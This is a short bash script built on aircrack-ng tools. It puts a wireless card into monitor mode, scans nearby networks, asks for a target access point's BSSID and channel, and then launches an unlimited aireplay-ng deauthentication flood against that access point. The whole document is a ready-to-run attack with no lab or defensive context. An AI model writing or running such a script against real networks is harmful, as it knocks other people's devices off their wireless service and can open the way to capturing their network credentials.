#!/bin/bash

# Start wireless interface and set it to monitor mode
airmon-ng start wlan0

# Scan for nearby wireless networks and find target BSSID and channel
airodump-ng wlan0mon &

# Wait for 30 seconds, then stop the scan
sleep 30 && pkill airodump-ng

# Prompt user to enter target BSSID and channel
 
read -p "Enter target BSSID: " bssid

read -p "Enter target channel: " channel

iwconfig wlan0mon channel $channel

# Attack the target access point with aireplay-ng
aireplay-ng --deauth 0 -a $bssid wlan0mon --ignore-negative-one

